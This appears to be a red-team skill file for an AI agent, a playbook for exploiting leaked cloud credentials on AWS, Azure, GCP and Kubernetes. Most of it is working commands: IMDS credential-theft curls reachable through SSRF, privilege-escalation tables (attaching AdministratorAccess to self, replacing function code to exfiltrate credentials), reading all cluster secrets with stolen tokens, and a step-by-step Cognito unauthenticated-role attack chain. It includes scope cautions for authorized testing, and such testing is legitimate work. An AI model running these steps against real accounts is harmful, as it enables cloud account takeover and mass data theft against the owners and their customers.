---
name: cloud-iam-deep
description: "Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId to GetCredentialsForIdentity to IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain."
sources: aws-iam-docs, azure-rbac-docs, gcp-iam-docs, hackingthe.cloud, pacu, peirates, prowler, rhinosecuritylabs_research, hackerone_public
report_count: 6
---

# Cloud IAM Deep — AWS / Azure / GCP Attack Chain

## When to use

Trigger when:
- A cloud credential surfaces (key, secret, token, JSON file)
- SSRF chain reaches IMDS / metadata endpoint
- APK / git-leak reveals embedded cloud key
- Recon shows public S3/GCS/Azure-blob with permissions you can verify
- A Kubernetes API or service-account token is exposed
- Post-RCE on a cloud-hosted instance — pivot to cloud control plane

Do NOT use for:
- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
- Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill

## Credential identification (first 60 seconds)

```bash
# AWS access key patterns
AKIA[0-9A-Z]{16}                # IAM user access key (long-term)
ASIA[0-9A-Z]{16}                # STS temporary credential
AGPA[0-9A-Z]{16}                # IAM group
AIDA[0-9A-Z]{16}                # IAM user (user-id)
AROA[0-9A-Z]{16}                # IAM role
ANPA[0-9A-Z]{16}                # Managed policy

# AWS secret pattern (40-char base64-ish — context required)
[A-Za-z0-9/+=]{40}              # AWS secret access key

# Azure
AccountKey=[A-Za-z0-9+/=]{86}   # Storage account key
client_secret pattern + UUID    # Azure AD app credential

# GCP service account JSON
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----..."
}

# K8s SA token (JWT format — decode to confirm)
eyJhbGciOiJSUzI1...     # decode kid claim to see issuer
```

## AWS — read-only validation (the safe first step)

```bash
# Set credential
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# 1. WHO am I?
aws sts get-caller-identity
# Returns: UserId, Account, Arn
# Arn tells you: IAM user vs role, account ID, name

# 2. WHAT can I do? (the privesc question)
# Try common read-only first — failures still inform you
aws iam list-users 2>&1 | head -5
aws iam list-roles 2>&1 | head -5
aws iam list-policies 2>&1 | head -5
aws iam list-groups 2>&1 | head -5

# 3. WHAT policies are attached to me?
aws iam list-attached-user-policies --user-name <self>
aws iam list-user-policies --user-name <self>          # inline policies
aws iam list-groups-for-user --user-name <self>

# 4. Service-by-service surface
aws ec2 describe-instances --max-items 1 2>&1 | head
aws s3 ls 2>&1 | head -10
aws lambda list-functions --max-items 5 2>&1 | head
aws rds describe-db-instances --max-items 5 2>&1 | head
aws secretsmanager list-secrets --max-results 5 2>&1 | head
aws ssm describe-parameters --max-results 5 2>&1 | head

# 5. Audit any cross-account / external trust
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20
```

## AWS privesc patterns (24+ documented — `iam_privesc` techniques)

Quick lookup — if you have any of these IAM actions, escalate via the listed technique:

| You have | Escalate via |
|---|---|
| `iam:CreateAccessKey` | Create access key on any user → impersonate |
| `iam:CreateLoginProfile` | Set a console password on a user → login |
| `iam:UpdateLoginProfile` | Reset console password on a user |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
| `iam:PutGroupPolicy` | Inline policy on a group |
| `iam:PutRolePolicy` | Inline on a role you can assume |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |
| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |
| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
| `cloudformation:UpdateStack` | Modify stack to grant self admin |
| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |

Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.

## AWS — STS / cross-account / role chaining

```bash
# Enumerate roles you can assume across accounts
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
# Parse for "Principal.AWS" containing different account IDs

# Assume a role
aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"

# Set new creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify
aws sts get-caller-identity  # should now show OTHER_ACCT

# Re-enumerate from new identity (chain continues)
```

**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.

## AWS IMDSv1 / IMDSv2 abuse via SSRF

```bash
# IMDSv1 (legacy, still common — straight GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns role name → fetch creds:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# JSON with AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
TOKEN=...
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass for IMDSv2:
# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
# Exception: SSRF in functions that themselves perform requests with custom headers.
```

## Azure — credential validation

```bash
# Login with a credential
az login --service-principal -u <appId> -p <password> --tenant <tenantId>
# OR with managed identity (from inside Azure VM)
az login --identity

# Who am I?
az account show

# Subscriptions
az account list --output table

# Role assignments (Azure RBAC)
az role assignment list --assignee <objectId> --all
az role assignment list --all --query '[?principalId==`<objectId>`]' --output table

# Resources I can read
az resource list --output table | head -30
az storage account list --output table
az keyvault list --output table
az vm list --output table
```

## Azure — Managed Identity abuse

```bash
# From inside Azure VM (post-RCE or SSRF to IMDS-equivalent):
# Endpoint: http://169.254.169.254/metadata/identity/oauth2/token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns access_token for the Managed Identity. Use:
TOKEN="..."
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Get token for Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Get token for Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
# → If Managed Identity has Graph permissions, read all M365 data
```

## Azure privesc patterns

| You have | Escalate via |
|---|---|
| `Microsoft.Authorization/roleAssignments/write` on tenant | Self-assign Owner |
| `Microsoft.Authorization/roleDefinitions/write` | Modify role def to add powers |
| `Microsoft.Compute/virtualMachines/runCommand/action` | Run command on VM (with VM's MI) |
| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | Read all KV secrets |
| `Microsoft.Storage/storageAccounts/listkeys/action` | Read all storage blobs |
| `Microsoft.Web/sites/publishxml/action` | Get publish profile → RCE on app |
| `Microsoft.Web/sites/host/listkeys/action` | Func app key → RCE via function trigger |
| `Microsoft.AAD.Directory.* (App reg) + RoleManagement.ReadWrite.Directory` | Grant self Global Admin |

## GCP — service account JSON

```bash
# Activate
gcloud auth activate-service-account --key-file=sa-leaked.json

# Who am I?
gcloud auth list
gcloud config get-value account
gcloud config get-value project

# What roles does this SA have? (project-level only — not org-level)
gcloud projects get-iam-policy <projectId> \
  --flatten="bindings[].members" \
  --format="table(bindings.role)" \
  --filter="bindings.members:<sa-email>"

# Service-by-service:
gcloud compute instances list 2>&1 | head
gcloud storage buckets list 2>&1 | head
gcloud secrets list 2>&1 | head
gcloud functions list 2>&1 | head
gcloud sql instances list 2>&1 | head
gcloud container clusters list 2>&1 | head
```

## GCP privesc patterns

| You have | Escalate via |
|---|---|
| `iam.serviceAccounts.getAccessToken` on higher-priv SA | Get token for that SA |
| `iam.serviceAccounts.implicitDelegation` | Chain through delegate SAs |
| `iam.serviceAccounts.signBlob` / `signJwt` on higher SA | Forge JWT for that SA |
| `iam.serviceAccountKeys.create` | Create new key for any SA → impersonate |
| `iam.serviceAccounts.setIamPolicy` | Grant self impersonation rights |
| `iam.roles.update` (on custom role) | Add admin permissions to a role you have |
| `cloudfunctions.functions.update` (function runs as high-priv SA) | Replace code → exfil creds |
| `cloudfunctions.functions.call` + above | Trigger replacement |
| `compute.instances.setMetadata` | Add ssh-keys metadata → SSH as root |
| `compute.instances.setServiceAccount` | Attach higher-priv SA to instance |
| `cloudbuild.builds.create` (build runs as project SA) | Build executes attacker code |
| `deploymentmanager.deployments.create` | Resources created as DM SA |

## GCP IMDS attack (via SSRF or post-RCE)

```bash
# GCP IMDS endpoint:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Returns access token. Use:
TOKEN=...
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## Kubernetes — exposed API / SA token

```bash
# Check anonymous access on K8s API
curl -sk "https://k8s.target.com:6443/api/v1/namespaces"

# Anonymous binding (system:anonymous user) — surprisingly common
curl -sk "https://k8s.target.com:6443/api/v1/pods?limit=1"

# If SA token exfil'd (eyJ...):
export TOKEN="eyJ..."
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get namespaces
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify auth can-i --list
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get pods -A
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get secrets -A
```

### K8s privesc patterns

| You have | Escalate via |
|---|---|
| `pods/exec` on high-priv pod | exec into pod with admin SA token |
| `pods/create` + `serviceaccounts/use` | Create pod mounting admin SA token |
| `secrets/get` | Read any service-account token in cluster |
| `clusterrolebindings/create` | Grant self cluster-admin |
| `roles/escalate` or `clusterroles/escalate` | Add permissions to role |
| `nodes/proxy` | Proxy to kubelet on any node → exec via kubelet |
| `bind` verb on roles | Bind a role you don't have to a subject |
| `impersonate` on users/groups/SAs | Operate as another principal |

## Tooling reference

| Tool | Cloud | Purpose |
|---|---|---|
| **Pacu** | AWS | Full red-team framework, 100+ modules |
| **enumerate-iam.py** | AWS | Brute-force list of API calls to discover permissions |
| **PMapper** | AWS | Visualize privesc paths as graph |
| **CloudFox** | AWS | Recon-focused (enumerate resources, no privesc) |
| **Prowler** | AWS/Azure/GCP | Compliance scanning + enumeration |
| **ScoutSuite** | AWS/Azure/GCP/OCI | Multi-cloud audit |
| **AzureHound** | Azure | BloodHound-style graph for Azure |
| **MicroBurst** | Azure | Azure-specific recon and abuse modules |
| **ROADtools** | Azure | Entra ID enumeration toolkit |
| **GCPBucketBrute** | GCP | GCS bucket permission enumeration |
| **gcpwn** | GCP | GCP-specific exploitation framework |
| **Peirates** | K8s | Container/cluster exploitation toolkit |
| **kube-hunter** | K8s | Auto-scan cluster from inside/outside |
| **kubectl-trace** | K8s | Trace processes (post-foothold) |

## Anti-patterns

- **DO NOT run write/delete operations without explicit OK** — IAM mutation is destructive and audit-visible
- **DO NOT enumerate everything in scope of an account** — `aws iam list-users` against an account with 50,000 users is loud and slow
- **DO NOT use `aws *` with non-test creds without confirming you have the right account** — accidentally hitting prod = career risk
- **DO NOT confuse "I have the credential" with "this credential is current"** — always check expiration / rotation via STS first
- **DO NOT assume an STS token from one account works across accounts** — region restrictions and trust policies apply
- **DO NOT skip CloudTrail/Activity Log awareness** — every API call is logged; pair with `mid-engagement-ir-detection`
- **DO NOT pivot deeper than the SOW allows** — discovering admin creds doesn't mean using them; some engagements are read-only

## Bridge to neighboring skills

- `hunt-cloud-misconfig` — finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
- `hunt-ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
- `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
- `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
- `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
- `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations

## Severity scoring guidance

| Finding | Severity |
|---|---|
| AWS access key with `*:*` in policy → confirmed admin | Critical |
| GCP SA JSON with `roles/owner` on production project | Critical |
| Azure MI on internet-exposed VM with Owner role | Critical |
| Leaked cred with read-only on prod data store | High (or Critical depending on data sensitivity) |
| Leaked cred with privesc path but no admin yet | High |
| Leaked cred — read access only to non-sensitive | Medium |
| Anonymous public bucket — listing only | Low/Medium |
| Anonymous bucket — write permission | High |

## Cleanup discipline (deliverable hygiene)

If during the engagement you:
- Used `sts:AssumeRole` to chain — note the role names and times in IoCs
- Created any IAM resources (test users, roles, policies) — list them with explicit cleanup confirmation
- Read sensitive data (Secrets Manager, KMS keys, Storage blob content) — note in deliverable that data was viewed but not exfiltrated outside the engagement systems

Cloud activity is trivially auditable; the client WILL find it post-engagement. Documenting now > getting blindsided later.

## AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)

AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.

### Step 1 — Discover the IdentityPoolId

The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:

```bash
# JS bundle / SPA regex (against *.js, *.html, source-map files)
grep -ErohE "identityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "IdentityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "\"PoolId\"\s*:\s*\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\"" .

# Mobile APK (after jadx decompile)
grep -rEi "identity[_-]?pool[_-]?id" decoded/
grep -rE "\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\"" decoded/

# Also check
amplifyconfiguration.json
awsconfiguration.json
aws-exports.js
.env.js
*.js.map
```

Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora.

### Step 2 — `GetId` (unauth)

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \
  --region us-east-1 \
  --no-sign-request
```

`--no-sign-request` is critical — tells the CLI not to look for ambient AWS credentials. Returns `{"IdentityId": "us-east-1:<uuid>"}`. If this returns `NotAuthorizedException`, unauth identities are disabled — stop, not exploitable.

### Step 3 — `GetCredentialsForIdentity`

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:<returned-uuid> \
  --region us-east-1 \
  --no-sign-request
```

Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA…), `SecretKey`, `SessionToken`, `Expiration`.

### Step 4 — Confirm role ARN

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed.

### Step 5 — Enumerate role permissions

Direct (rare):
```bash
aws iam get-role --role-name Cognito_<PoolName>Unauth_Role
aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
```

Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| Unauth role with `*:*` or `AdministratorAccess` | **Critical** (9.8+) | Full AWS account takeover |
| Unauth role with `s3:Get*` / `s3:List*` on production customer buckets, or `dynamodb:Scan` on user tables | **Critical** (9.1-9.8) | Mass PII / data breach |
| Unauth role with `appsync:GraphQL` on production API, or `lambda:InvokeFunction` on internal lambdas | **Critical** (9.0) | Authenticated backend access |
| Unauth role with `cognito-idp:Admin*` on the linked User Pool | **Critical** (9.1) | Mass ATO primitive |
| Unauth role with `iam:PassRole` + create-function | **Critical** (9.8) | Documented priv-esc to admin |

## Extended Content

This page only contains the core methodology. Extended reference content (payloads, full tables, detailed examples) has been moved to [`references/`](references/cloud-iam-deep-reference.md) for size management.

